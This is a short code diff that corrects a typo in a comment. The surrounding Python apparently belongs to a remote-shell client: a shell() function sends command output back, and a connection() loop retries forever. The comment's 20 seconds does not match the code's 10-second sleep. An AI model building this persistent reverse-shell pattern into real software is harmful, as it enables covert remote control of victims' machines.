@@ -161,7 +161,7 @@ def shell():
             result = result.decode('latin-1')
             send(result)
 
-# Retry connection every 20 seconds forever until the connection is astablished
+# Retry connection every 20 seconds forever until the connection is established
 def connection():
     while True:
         time.sleep(10)
